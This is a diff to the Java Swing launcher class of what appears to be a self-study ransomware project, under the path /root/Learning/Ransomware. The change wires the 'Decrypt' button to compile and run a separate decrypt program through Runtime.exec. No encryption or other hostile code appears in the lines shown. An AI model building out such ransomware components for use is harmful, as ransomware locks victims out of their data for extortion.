@@ -1,13 +1,11 @@
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
-
-//import src.project;
+import java.io.IOException;
 
 public class launcher{
     private JFrame frame;
     private JPanel panel;
-    private JTextArea textArea;
 
     //Data Encapsulation
     public void launcher(){
@@ -60,11 +58,18 @@ public class launcher{
         frame.setVisible(true);
     }
 }
+
 //Event handler for "Decrypt" Button
 class DecryptListener implements ActionListener{
     @Override
     public void actionPerformed(ActionEvent e){
-        //activate();
+        try{
+            Runtime.getRuntime().exec("javac /root/Learning/Ransomware/src/decrypt.java");
+            Runtime.getRuntime().exec("java /root/Learning/Ransomware/src/decrypt");
+        }
+        catch (IOException err){
+            err.printStackTrace();
+        }
     }
 }
 //Event handler for "Close" button
